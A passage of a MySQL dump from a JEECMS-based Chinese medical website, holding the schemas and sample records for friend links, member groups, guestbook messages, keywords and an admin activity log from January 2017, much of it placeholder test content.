INSERT INTO `jc_friendlink` VALUES ('1', '1', '1', '丁香园', 'http://www.dxy.cn/', null, 'caihongyixue@163.com', '丁香园', '3', '1', '1');
INSERT INTO `jc_friendlink` VALUES ('2', '1', '1', '挂号网', 'http://www.guahao.com/', null, '', '挂号网', '2', '1', '2');

-- ----------------------------
-- Table structure for jc_friendlink_ctg
-- ----------------------------
DROP TABLE IF EXISTS `jc_friendlink_ctg`;
CREATE TABLE `jc_friendlink_ctg` (
  `friendlinkctg_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `friendlinkctg_name` varchar(50) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  PRIMARY KEY (`friendlinkctg_id`),
  KEY `fk_jc_friendlinkctg_site` (`site_id`),
  CONSTRAINT `fk_jc_friendlinkctg_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COMMENT='CMS友情链接类别';

-- ----------------------------
-- Records of jc_friendlink_ctg
-- ----------------------------
INSERT INTO `jc_friendlink_ctg` VALUES ('1', '1', '文字链接', '1');
INSERT INTO `jc_friendlink_ctg` VALUES ('2', '1', '品牌专区（图片链接）', '2');
INSERT INTO `jc_friendlink_ctg` VALUES ('4', '1', '', '10');

-- ----------------------------
-- Table structure for jc_group
-- ----------------------------
DROP TABLE IF EXISTS `jc_group`;
CREATE TABLE `jc_group` (
  `group_id` int(11) NOT NULL AUTO_INCREMENT,
  `group_name` varchar(100) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `need_captcha` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否需要验证码',
  `need_check` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否需要审核',
  `allow_per_day` int(11) NOT NULL DEFAULT '4096' COMMENT '每日允许上传KB',
  `allow_max_file` int(11) NOT NULL DEFAULT '1024' COMMENT '每个文件最大KB',
  `allow_suffix` varchar(255) DEFAULT 'jpg,jpeg,gif,png,bmp' COMMENT '允许上传的后缀',
  `is_reg_def` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否默认会员组',
  `allow_file_size` int(11) NOT NULL DEFAULT '4096' COMMENT '每个上传文库的文件大小限制kB',
  `allow_file_total` int(11) NOT NULL DEFAULT '0' COMMENT '上传总数限制(0没有限制)',
  PRIMARY KEY (`group_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='CMS会员组表';

-- ----------------------------
-- Records of jc_group
-- ----------------------------
INSERT INTO `jc_group` VALUES ('1', '普通会员', '2', '1', '1', '0', '0', '', '1', '1024', '10');
INSERT INTO `jc_group` VALUES ('2', '认证医生', '10', '1', '1', '0', '0', '', '0', '4096', '0');

-- ----------------------------
-- Table structure for jc_guestbook
-- ----------------------------
DROP TABLE IF EXISTS `jc_guestbook`;
CREATE TABLE `jc_guestbook` (
  `guestbook_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `guestbookctg_id` int(11) NOT NULL,
  `member_id` int(11) DEFAULT NULL COMMENT '留言会员',
  `admin_id` int(11) DEFAULT NULL COMMENT '回复管理员',
  `ip` varchar(50) NOT NULL COMMENT '留言IP',
  `create_time` datetime NOT NULL COMMENT '留言时间',
  `replay_time` datetime DEFAULT NULL COMMENT '回复时间',
  `is_checked` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否审核',
  `is_recommend` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否推荐',
  PRIMARY KEY (`guestbook_id`),
  KEY `fk_jc_ctg_guestbook` (`guestbookctg_id`),
  KEY `fk_jc_guestbook_admin` (`admin_id`),
  KEY `fk_jc_guestbook_member` (`member_id`),
  KEY `fk_jc_guestbook_site` (`site_id`),
  CONSTRAINT `fk_jc_ctg_guestbook` FOREIGN KEY (`guestbookctg_id`) REFERENCES `jc_guestbook_ctg` (`guestbookctg_id`),
  CONSTRAINT `fk_jc_guestbook_admin` FOREIGN KEY (`admin_id`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_guestbook_member` FOREIGN KEY (`member_id`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_guestbook_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8 COMMENT='CMS留言';

-- ----------------------------
-- Records of jc_guestbook
-- ----------------------------
INSERT INTO `jc_guestbook` VALUES ('9', '1', '1', null, null, '127.0.0.1', '2017-02-01 12:19:47', null, '0', '0');
INSERT INTO `jc_guestbook` VALUES ('10', '1', '1', '1', null, '127.0.0.1', '2017-02-01 12:21:18', null, '0', '0');

-- ----------------------------
-- Table structure for jc_guestbook_ctg
-- ----------------------------
DROP TABLE IF EXISTS `jc_guestbook_ctg`;
CREATE TABLE `jc_guestbook_ctg` (
  `guestbookctg_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `ctg_name` varchar(100) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  PRIMARY KEY (`guestbookctg_id`),
  KEY `fk_jc_guestbookctg_site` (`site_id`),
  CONSTRAINT `fk_jc_guestbookctg_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='CMS留言类别';

-- ----------------------------
-- Records of jc_guestbook_ctg
-- ----------------------------
INSERT INTO `jc_guestbook_ctg` VALUES ('1', '1', '普通', '1', '普通留言');
INSERT INTO `jc_guestbook_ctg` VALUES ('2', '1', '投诉', '10', '投诉');

-- ----------------------------
-- Table structure for jc_guestbook_ctg_department
-- ----------------------------
DROP TABLE IF EXISTS `jc_guestbook_ctg_department`;
CREATE TABLE `jc_guestbook_ctg_department` (
  `guestbookctg_id` int(11) NOT NULL,
  `depart_id` int(11) NOT NULL,
  PRIMARY KEY (`guestbookctg_id`,`depart_id`),
  KEY `fk_jc_channel_department` (`depart_id`),
  CONSTRAINT `fk_jc_department_guestbook_ctg` FOREIGN KEY (`guestbookctg_id`) REFERENCES `jc_guestbook_ctg` (`guestbookctg_id`),
  CONSTRAINT `fk_jc_guestbook_ctg_department` FOREIGN KEY (`depart_id`) REFERENCES `jc_department` (`depart_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS留言类别部门关联表';

-- ----------------------------
-- Records of jc_guestbook_ctg_department
-- ----------------------------

-- ----------------------------
-- Table structure for jc_guestbook_ext
-- ----------------------------
DROP TABLE IF EXISTS `jc_guestbook_ext`;
CREATE TABLE `jc_guestbook_ext` (
  `guestbook_id` int(11) NOT NULL,
  `title` varchar(255) DEFAULT NULL COMMENT '留言标题',
  `content` longtext COMMENT '留言内容',
  `reply` longtext COMMENT '回复内容',
  `email` varchar(100) DEFAULT NULL COMMENT '电子邮件',
  `phone` varchar(100) DEFAULT NULL COMMENT '电话',
  `qq` varchar(50) DEFAULT NULL COMMENT 'QQ',
  KEY `fk_jc_ext_guestbook` (`guestbook_id`),
  CONSTRAINT `fk_jc_ext_guestbook` FOREIGN KEY (`guestbook_id`) REFERENCES `jc_guestbook` (`guestbook_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS留言内容';

-- ----------------------------
-- Records of jc_guestbook_ext
-- ----------------------------
INSERT INTO `jc_guestbook_ext` VALUES ('9', '特二食堂', '案说法是分散123123123', null, '123', '123', '123');
INSERT INTO `jc_guestbook_ext` VALUES ('10', '啊啊沙发', '爱上谁发的撒发顺丰的', null, '123123', '18111266553', '772112312');

-- ----------------------------
-- Table structure for jc_job_apply
-- ----------------------------
DROP TABLE IF EXISTS `jc_job_apply`;
CREATE TABLE `jc_job_apply` (
  `job_apply_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL COMMENT '用户id',
  `content_id` int(11) NOT NULL COMMENT '职位id',
  `apply_time` datetime NOT NULL COMMENT '申请时间',
  PRIMARY KEY (`job_apply_id`),
  KEY `fk_jc_job_apply_user` (`user_id`),
  KEY `fk_jc_job_apply_content` (`content_id`),
  CONSTRAINT `fk_jc_job_apply_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`),
  CONSTRAINT `fk_jc_job_apply_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='职位申请表';

-- ----------------------------
-- Records of jc_job_apply
-- ----------------------------

-- ----------------------------
-- Table structure for jc_keyword
-- ----------------------------
DROP TABLE IF EXISTS `jc_keyword`;
CREATE TABLE `jc_keyword` (
  `keyword_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) DEFAULT NULL COMMENT '站点ID',
  `keyword_name` varchar(100) NOT NULL COMMENT '名称',
  `url` varchar(255) NOT NULL COMMENT '链接',
  `is_disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  PRIMARY KEY (`keyword_id`),
  KEY `fk_jc_keyword_site` (`site_id`),
  CONSTRAINT `fk_jc_keyword_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS内容关键词表';

-- ----------------------------
-- Records of jc_keyword
-- ----------------------------
INSERT INTO `jc_keyword` VALUES ('1', null, '内容管理系统', '<a href=\"http://www.caihongyixue.com/\" target=\"_blank\">内容管理系统</a>', '0');

-- ----------------------------
-- Table structure for jc_log
-- ----------------------------
DROP TABLE IF EXISTS `jc_log`;
CREATE TABLE `jc_log` (
  `log_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) DEFAULT NULL,
  `site_id` int(11) DEFAULT NULL,
  `category` int(11) NOT NULL COMMENT '日志类型',
  `log_time` datetime NOT NULL COMMENT '日志时间',
  `ip` varchar(50) DEFAULT NULL COMMENT 'IP地址',
  `url` varchar(255) DEFAULT NULL COMMENT 'URL地址',
  `title` varchar(255) DEFAULT NULL COMMENT '日志标题',
  `content` varchar(255) DEFAULT NULL COMMENT '日志内容',
  PRIMARY KEY (`log_id`),
  KEY `fk_jc_log_site` (`site_id`),
  KEY `fk_jc_log_user` (`user_id`),
  CONSTRAINT `fk_jc_log_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_log_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=253 DEFAULT CHARSET=utf8 COMMENT='CMS日志表';

-- ----------------------------
-- Records of jc_log
-- ----------------------------
INSERT INTO `jc_log` VALUES ('1', '1', null, '1', '2017-01-13 18:56:15', '127.0.0.1', '/jeeadmin/jeecms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('2', '1', '1', '3', '2017-01-13 18:57:02', '127.0.0.1', '/jeeadmin/jeecms/site_config/o_base_update.do', '站点基本设置', null);
INSERT INTO `jc_log` VALUES ('3', '1', '1', '3', '2017-01-13 18:58:23', '127.0.0.1', '/jeeadmin/jeecms/config/o_login_update.do', '修改登录设置', null);
INSERT INTO `jc_log` VALUES ('4', '1', null, '1', '2017-01-13 19:06:38', '127.0.0.1', '/jeeadmin/jeecms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('5', '1', null, '1', '2017-01-13 19:11:20', '127.0.0.1', '/jeeadmin/jeecms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('6', '1', null, '1', '2017-01-13 19:19:59', '127.0.0.1', '/jeeadmin/jeecms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('7', '1', null, '1', '2017-01-13 21:42:34', '127.0.0.1', '/jeeadmin/jeecms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('8', '1', '1', '3', '2017-01-13 21:43:26', '127.0.0.1', '/jeeadmin/jeecms/site_config/o_company_update.do', '站点基本设置', null);
INSERT INTO `jc_log` VALUES ('9', '1', null, '1', '2017-01-13 23:09:26', '127.0.0.1', '/jeeadmin/jeecms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('10', '1', '1', '3', '2017-01-14 02:51:14', '127.0.0.1', '/admin/cms/config/o_system_update.do', '修改系统设置', null);
INSERT INTO `jc_log` VALUES ('11', '1', null, '1', '2017-01-14 03:12:53', '127.0.0.1', '/admin/cms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('12', '1', '1', '3', '2017-01-14 03:30:04', '127.0.0.1', '/admin/cms/group/o_delete.do', '删除会员组', 'id=3;name=vip');
INSERT INTO `jc_log` VALUES ('13', '1', '1', '3', '2017-01-14 03:30:23', '127.0.0.1', '/admin/cms/group/o_update.do', '修改会员组', 'id=2;name=医生');
INSERT INTO `jc_log` VALUES ('14', '1', '1', '3', '2017-01-14 03:30:36', '127.0.0.1', '/admin/cms/group/o_update.do', '修改会员组', 'id=2;name=医生组');
INSERT INTO `jc_log` VALUES ('15', '1', '1', '3', '2017-01-14 13:25:58', '127.0.0.1', '/admin/cms/channel/o_update.do', '修改栏目', 'id=75;name=空中课堂');
INSERT INTO `jc_log` VALUES ('16', '1', '1', '3', '2017-01-14 13:26:16', '127.0.0.1', '/admin/cms/channel/o_update.do', '修改栏目', 'id=76;name=专家团队');
INSERT INTO `jc_log` VALUES ('17', '1', '1', '3', '2017-01-14 13:26:57', '127.0.0.1', '/admin/cms/channel/o_update.do', '修改栏目', 'id=77;name=在线论坛');
INSERT INTO `jc_log` VALUES ('18', '1', '1', '3', '2017-01-14 13:27:28', '127.0.0.1', '/admin/cms/channel/o_update.do', '修改栏目', 'id=78;name=预约会诊');
INSERT INTO `jc_log` VALUES ('19', '1', '1', '3', '2017-01-14 13:27:59', '127.0.0.1', '/admin/cms/channel/o_update.do', '修改栏目', 'id=79;name=新闻资讯');
INSERT INTO `jc_log` VALUES ('20', '1', '1', '3', '2017-01-14 13:28:13', '127.0.0.1', '/admin/cms/channel/o_update.do', '修改栏目', 'id=81;name=关于我们');
INSERT INTO `jc_log` VALUES ('21', '1', '1', '3', '2017-01-14 13:28:21', '127.0.0.1', '/admin/cms/channel/o_delete.do', '删除栏目', 'id=80;title=null');
INSERT INTO `jc_log` VALUES ('22', '1', '1', '3', '2017-01-14 15:33:50', '127.0.0.1', '/admin/cms/channel/o_delete.do', '删除栏目', 'id=92;title=null');
INSERT INTO `jc_log` VALUES ('23', '1', '1', '3', '2017-01-14 15:39:38', '127.0.0.1', '/admin/cms/channel/o_delete.do', '删除栏目', 'id=93;title=null');
INSERT INTO `jc_log` VALUES ('24', '1', '1', '3', '2017-01-14 15:39:40', '127.0.0.1', '/admin/cms/channel/o_delete.do', '删除栏目', 'id=91;title=null');
INSERT INTO `jc_log` VALUES ('25', '1', '1', '3', '2017-01-14 15:39:43', '127.0.0.1', '/admin/cms/channel/o_delete.do', '删除栏目', 'id=90;title=null');
INSERT INTO `jc_log` VALUES ('26', '1', '1', '3', '2017-01-14 15:56:12', '127.0.0.1', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/include/footer.html');
INSERT INTO `jc_log` VALUES ('27', '1', '1', '3', '2017-01-14 16:13:45', '127.0.0.1', '/admin/cms/site_config/o_base_update.do', '站点基本设置', null);
INSERT INTO `jc_log` VALUES ('28', '1', '1', '3', '2017-01-14 16:14:27', '127.0.0.1', '/admin/cms/config/o_system_update.do', '修改系统设置', null);
INSERT INTO `jc_log` VALUES ('29', '1', '1', '3', '2017-01-14 16:20:09', '127.0.0.1', '/admin/cms/config/o_login_update.do', '修改登录设置', null);
INSERT INTO `jc_log` VALUES ('30', '1', '1', '3', '2017-01-14 16:21:57', '127.0.0.1', '/admin/cms/config/o_login_update.do', '修改登录设置', null);
INSERT INTO `jc_log` VALUES ('31', '1', '1', '3', '2017-01-14 16:51:54', '127.0.0.1', '/admin/cms/channel/o_update.do', '修改栏目', 'id=75;name=新闻资讯');
INSERT INTO `jc_log` VALUES ('32', '1', '1', '3', '2017-01-14 16:53:02', '127.0.0.1', '/admin/cms/channel/o_delete.do', '删除栏目', 'id=79;title=null');
INSERT INTO `jc_log` VALUES ('33', '1', '1', '3', '2017-01-14 16:53:34', '127.0.0.1', '/admin/cms/channel/o_update.do', '修改栏目', 'id=77;name=空中课堂');
INSERT INTO `jc_log` VALUES ('34', '1', '1', '3', '2017-01-14 18:21:32', '127.0.0.1', '/admin/cms/channel/o_update.do', '修改栏目', 'id=81;name=关于我们');
INSERT INTO `jc_log` VALUES ('35', '1', '1', '3', '2017-01-14 18:23:08', '127.0.0.1', '/admin/cms/friendlink/o_update.do', '修改友情链接', 'id=1;name=彩虹医学网官网');
INSERT INTO `jc_log` VALUES ('36', '1', '1', '3', '2017-01-14 18:23:21', '127.0.0.1', '/admin/cms/friendlink/o_delete.do', '删除友情链接', 'id=6;name=ihush');
INSERT INTO `jc_log` VALUES ('37', '1', '1', '3', '2017-01-14 18:23:23', '127.0.0.1', '/admin/cms/friendlink/o_delete.do', '删除友情链接', 'id=5;name=亚马逊');
INSERT INTO `jc_log` VALUES ('38', '1', '1', '3', '2017-01-14 18:23:26', '127.0.0.1', '/admin/cms/friendlink/o_delete.do', '删除友情链接', 'id=4;name=当当网');
INSERT INTO `jc_log` VALUES ('39', '1', '1', '3', '2017-01-14 18:23:28', '127.0.0.1', '/admin/cms/friendlink/o_delete.do', '删除友情链接', 'id=3;name=京东商城');
INSERT INTO `jc_log` VALUES ('40', '1', '1', '3', '2017-01-14 19:14:06', '127.0.0.1', '/admin/cms/friendlink/o_update.do', '修改友情链接', 'id=2;name=中华人民共和国国家卫生和计划生育委员会');
INSERT INTO `jc_log` VALUES ('41', '1', '1', '3', '2017-01-14 19:14:14', '127.0.0.1', '/admin/cms/friendlink/o_update.do', '修改友情链接', 'id=1;name=彩虹医学网官网');
INSERT INTO `jc_log` VALUES ('42', '1', null, '1', '2017-01-14 23:09:11', '127.0.0.1', '/admin/cms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('43', '1', '1', '3', '2017-01-14 23:12:56', '127.0.0.1', '/admin/cms/topic/o_save.do', '增加专题', 'id=4;name=专题共读');
INSERT INTO `jc_log` VALUES ('44', '1', '1', '3', '2017-01-14 23:13:03', '127.0.0.1', '/admin/cms/topic/o_update.do', '修改专题', 'id=4;name=专题共读');
INSERT INTO `jc_log` VALUES ('45', '1', '1', '3', '2017-01-14 23:15:24', '127.0.0.1', '/admin/cms/topic/o_update.do', '修改专题', 'id=4;name=专题共读');
INSERT INTO `jc_log` VALUES ('46', '1', '1', '3', '2017-01-14 23:54:33', '127.0.0.1', '/admin/cms/template/o_delete_single.do', '删除模板', 'filename=/WEB-INF/t/cms/www/default/about');
INSERT INTO `jc_log` VALUES ('47', '1', '1', '3', '2017-01-15 00:01:53', '127.0.0.1', '/admin/cms/content/o_update.do', '修改文章', 'id=111;title=专访百度科学家徐伟：百度比谷歌的人工智能平台更易上手');
INSERT INTO `jc_log` VALUES ('48', '1', '1', '3', '2017-01-15 00:02:18', '127.0.0.1', '/admin/cms/content/o_update.do', '修改文章', 'id=37;title=苹果研发神秘新设备：体积类似Apple TV 支持NFC蓝牙');
INSERT INTO `jc_log` VALUES ('49', '1', '1', '3', '2017-01-15 00:06:06', '127.0.0.1', '/admin/cms/channel/o_save.do', '增加栏目', 'id=94;title=null');
INSERT INTO `jc_log` VALUES ('50', '1', '1', '3', '2017-01-15 00:07:04', '127.0.0.1', '/admin/cms/channel/o_save.do', '增加栏目', 'id=95;title=null');
INSERT INTO `jc_log` VALUES ('51', '1', '1', '3', '2017-01-15 00:07:30', '127.0.0.1', '/admin/cms/channel/o_save.do', '增加栏目', 'id=96;title=null');
INSERT INTO `jc_log` VALUES ('52', '1', '1', '3', '2017-01-15 00:08:22', '127.0.0.1', '/admin/cms/channel/o_update.do', '修改栏目', 'id=94;name=医生论坛');
INSERT INTO `jc_log` VALUES ('53', '1', '1', '3', '2017-01-15 00:08:48', '127.0.0.1', '/admin/cms/channel/o_update.do', '修改栏目', 'id=96;name=网站新闻');
INSERT INTO `jc_log` VALUES ('54', '1', '1', '3', '2017-01-15 00:08:57', '127.0.0.1', '/admin/cms/channel/o_update.do', '修改栏目', 'id=95;name=患者园地');
INSERT INTO `jc_log` VALUES ('55', '1', '1', '3', '2017-01-15 00:59:57', '127.0.0.1', '/admin/cms/channel/o_update.do', '修改栏目', 'id=81;name=关于我们');
INSERT INTO `jc_log` VALUES ('56', '1', '1', '3', '2017-01-15 01:00:49', '127.0.0.1', '/admin/cms/channel/o_update.do', '修改栏目', 'id=81;name=关于我们');
INSERT INTO `jc_log` VALUES ('57', '1', '1', '3', '2017-01-15 10:59:18', '127.0.0.1', '/admin/cms/group/o_update.do', '修改会员组', 'id=2;name=认证医生');
INSERT INTO `jc_log` VALUES ('58', '1', '1', '3', '2017-01-15 10:59:49', '127.0.0.1', '/admin/cms/member/o_save.do', '增加会员', 'id=2;username=caihong');
INSERT INTO `jc_log` VALUES ('59', '1', '1', '3', '2017-01-15 23:14:00', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=142;title=四川政府采购近三年改革成效明显 政府采购透明度四川最优');
INSERT INTO `jc_log` VALUES ('60', '1', '1', '3', '2017-01-15 23:35:39', '127.0.0.1', '/admin/cms/content/o_update.do', '修改文章', 'id=142;title=四川政府采购近三年改革成效明显 政府采购透明度四川最优');
INSERT INTO `jc_log` VALUES ('61', '1', '1', '3', '2017-01-15 23:38:32', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=143;title=入常8个月又退常 南昌“总经理”有了新消息');
INSERT INTO `jc_log` VALUES ('62', '1', '1', '3', '2017-01-15 23:41:10', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=144;title=一声一声案说法的盛大的发售');
INSERT INTO `jc_log` VALUES ('63', '1', '1', '3', '2017-01-15 23:41:39', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=145;title=按时发达身份证照V型在v');
INSERT INTO `jc_log` VALUES ('64', '1', '1', '3', '2017-01-15 23:42:15', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=146;title=撒娇发阿萨德飞洒发武器二千万人气');
INSERT INTO `jc_log` VALUES ('65', '1', '1', '3', '2017-01-15 23:42:42', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=147;title=qwerqwrasfdasfasfa');
INSERT INTO `jc_log` VALUES ('66', '1', '1', '3', '2017-01-15 23:43:10', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=148;title=玩玩儿去玩儿去文如其人');
INSERT INTO `jc_log` VALUES ('67', '1', '1', '3', '2017-01-15 23:43:51', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=149;title=姐姐姐姐姐姐了');
INSERT INTO `jc_log` VALUES ('68', '1', '1', '3', '2017-01-16 00:14:30', '127.0.0.1', '/admin/cms/content/o_update.do', '修改文章', 'id=130;title=党中央推进民族工作创新发展纪实');
INSERT INTO `jc_log` VALUES ('69', '1', '1', '3', '2017-01-16 00:14:54', '127.0.0.1', '/admin/cms/content/o_update.do', '修改文章', 'id=132;title=黄金接连下跌难道又等大妈来托盘');
INSERT INTO `jc_log` VALUES ('70', '1', '1', '3', '2017-01-16 00:15:17', '127.0.0.1', '/admin/cms/content/o_update.do', '修改文章', 'id=131;title=楼市调控应跳出周期性怪圈');
INSERT INTO `jc_log` VALUES ('71', '1', '1', '3', '2017-01-16 00:15:46', '127.0.0.1', '/admin/cms/content/o_update.do', '修改文章', 'id=30;title=不实名手机号停机在即 移动：不对任何社会渠道授权网络售卡');
INSERT INTO `jc_log` VALUES ('72', '1', '1', '3', '2017-01-16 00:16:21', '127.0.0.1', '/admin/cms/content/o_update.do', '修改文章', 'id=11;title=全国28省遭灾 已投入抗洪抢险777万人次');
INSERT INTO `jc_log` VALUES ('73', '1', '1', '3', '2017-01-16 00:16:44', '127.0.0.1', '/admin/cms/content/o_update.do', '修改文章', 'id=12;title=习近平就法国尼斯恐袭事件向法总统致慰问电');
INSERT INTO `jc_log` VALUES ('74', '1', '1', '3', '2017-01-16 00:23:57', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=150;title=ggggggggggggggg');
INSERT INTO `jc_log` VALUES ('75', '1', '1', '3', '2017-01-16 00:24:48', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=151;title=的发生大发啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊');
INSERT INTO `jc_log` VALUES ('76', '1', '1', '3', '2017-01-16 00:25:18', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=152;title=up噢速度发普爱刷屏的发顺丰');
INSERT INTO `jc_log` VALUES ('77', '1', '1', '3', '2017-01-16 00:25:39', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=153;title=阿斯顿发沙发舒服撒发生');
INSERT INTO `jc_log` VALUES ('78', '1', '1', '3', '2017-01-16 00:26:09', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=154;title=啊是的顶顶顶顶顶顶顶顶顶顶的顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶');
INSERT INTO `jc_log` VALUES ('79', '1', '1', '3', '2017-01-16 00:26:45', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=155;title=大事发生的发生发生');
INSERT INTO `jc_log` VALUES ('80', '1', '1', '3', '2017-01-16 00:27:10', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=156;title=呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵');
INSERT INTO `jc_log` VALUES ('81', '1', '1', '3', '2017-01-16 00:27:48', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=157;title=快快快快快快快快快快快快快快快快快快快快快');
INSERT INTO `jc_log` VALUES ('82', '1', '1', '3', '2017-01-16 00:28:46', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=158;title=就发顺丰卡死了发送');
INSERT INTO `jc_log` VALUES ('83', '1', '1', '3', '2017-01-16 00:29:11', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=159;title=快快快快快快快快快快快快快快快快快快快快快');
INSERT INTO `jc_log` VALUES ('84', '1', '1', '3', '2017-01-16 00:29:38', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=160;title=大法师打发阿萨德法师法师的法师法');
INSERT INTO `jc_log` VALUES ('85', '1', '1', '3', '2017-01-16 00:30:14', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=161;title=啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦');
INSERT INTO `jc_log` VALUES ('86', '1', '1', '3', '2017-01-16 00:30:40', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=162;title=啊啊啊啊啊啊啊啊啊啊啊是的发生');
INSERT INTO `jc_log` VALUES ('87', '1', '1', '3', '2017-01-16 00:31:10', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=163;title=啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊阿斯蒂芬');
INSERT INTO `jc_log` VALUES ('88', '1', '1', '3', '2017-01-16 00:31:44', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=164;title=在嘻嘻嘻嘻嘻嘻嘻嘻嘻嘻嘻嘻嘻嘻嘻谢谢');
INSERT INTO `jc_log` VALUES ('89', '1', '1', '3', '2017-01-16 00:32:10', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=165;title=啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦是放大师傅');
INSERT INTO `jc_log` VALUES ('90', '1', '1', '3', '2017-01-16 00:32:38', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=166;title=vczxcvzxv啊啊阿斯顿发生');
INSERT INTO `jc_log` VALUES ('91', '1', '1', '3', '2017-01-16 00:33:11', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=167;title=阿事实上事实上事实上是是是试试沙发舒服撒');
INSERT INTO `jc_log` VALUES ('92', '1', '1', '3', '2017-01-16 00:33:39', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=168;title=啊啊啊啊啊啊啊啊啊啊啊啊啊阿斯顿发顺丰撒发顺丰暗示法萨芬');
INSERT INTO `jc_log` VALUES ('93', '1', '1', '3', '2017-01-16 00:34:14', '127.0.0.1', '/admin/cms/content/o_save.do', '增加文章', 'id=169;title=安抚阿斯顿发顺丰1而沙发沙发舒服撒发生法萨芬');
INSERT INTO `jc_log` VALUES ('94', '1', '1', '3', '2017-01-16 00:37:12', '127.0.0.1', '/admin/cms/content/o_update.do', '修改文章', 'id=157;title=快快快快快快快快快快快快快快快快快快快快快');
INSERT INTO `jc_log` VALUES ('95', '1', '1', '3', '2017-01-16 00:37:35', '127.0.0.1', '/admin/cms/content/o_update.do', '修改文章', 'id=153;title=阿斯顿发沙发舒服撒发生');
INSERT INTO `jc_log` VALUES ('96', '1', null, '1', '2017-01-16 11:05:07', '127.0.0.1', '/admin/cms/login.do', 'login success', null);
